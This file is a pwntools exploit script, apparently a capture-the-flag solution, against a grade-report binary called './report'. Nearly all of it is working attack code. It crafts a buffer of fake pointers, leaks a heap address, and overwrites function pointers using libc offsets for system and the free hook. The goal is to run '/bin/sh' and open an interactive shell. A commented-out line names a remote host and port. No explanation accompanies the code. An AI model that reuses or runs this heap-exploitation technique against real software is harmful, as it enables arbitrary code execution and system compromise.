from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process('./report')
# p = remote("52.78.27.112", 10001)

DEBUG = True

script = "b *0x401156\n"

gdb.attach(p, gdbscript=script)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info("Received:" + response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def add(subject_type, name, credit, grade):
  r("==>")
  s("1")

  r("==>")
  s(str(subject_type))

  r("==>")
  s(name)

  r("==>")
  s(str(credit))

  r("==>")
  s(str(grade))

def delete(name):
  r("==>")
  s("2")

  r("==>")
  s(name)

def do_print():
  r("==>")
  s("3")

stdin_offset = 0x3c48e0
system_offset = 0x45390

r("==>")
s("asdfasdf\n", False)

setSubName = 0x402118
setTeacherName = 0x4020e8
calcTotalCredit = 0x4020f8
stdin = 0x603070
offset_buf = 0x603a80
freehook_offset = 0x3c67a8
fhptr_offset = 0x3c3ef8

profile = '/bin/sh;'

profile = profile.ljust(0x80, '\x00')
profile += p64(setTeacherName - 8)
profile += p64(setSubName - 8)

profile = profile.ljust(0x100, '\x00')
profile = p64(setSubName - 8)
profile += p64(offset_buf) # stdin

profile = profile.ljust(0x800, '\x00')
profile += p64(calcTotalCredit - 0x8)
profile += 'A' * 16
profile += p64(stdin - 0x18)
profile += p64(offset_buf - 0x18)
profile += p64(offset_buf - 0x18 + 8)
profile += p64(0) * 13
profile += p64(0)

profile = profile.ljust(0x900, '\x00')
profile += p64(calcTotalCredit - 0x8)
profile += 'A' * 16
profile += p64(stdin - 0x18)
profile += p64(offset_buf - 0x18)
profile += p64(0) * 14
profile += p64(0)

r("==>")
s(profile, False)

add(1, 'ebmoon', 3, 3)

do_print()

r("asdfasdf")
leak_str = r("====")[:4]
if leak_str[-1] == '\x20':
  leak_str = leak_str[:-1]

leak = u64(leak_str.ljust(8, "\x00"))
buf = leak - 0x1010

print "heap leak: 0x%x" % leak
print "buf: 0x%x" % buf

# grade = 
# add(1, 'ebmoon', p64(setSubName - 8), struct.unpack('<f', 123.3))

r("==>")
s("4")

payload = p64((1 << 64) + system_offset - stdin_offset)
payload += p64(fhptr_offset - system_offset)

payload += p64(buf + 0x100)
payload += p64(buf + 0x800)
payload += p64(buf + 0x80)

payload += p64(buf + 0x900)
payload += p64(buf + 0x88)

payload = payload.ljust(0x68, "\x00")

r("==>")
s(payload, False)

p.interactive()
p.close()
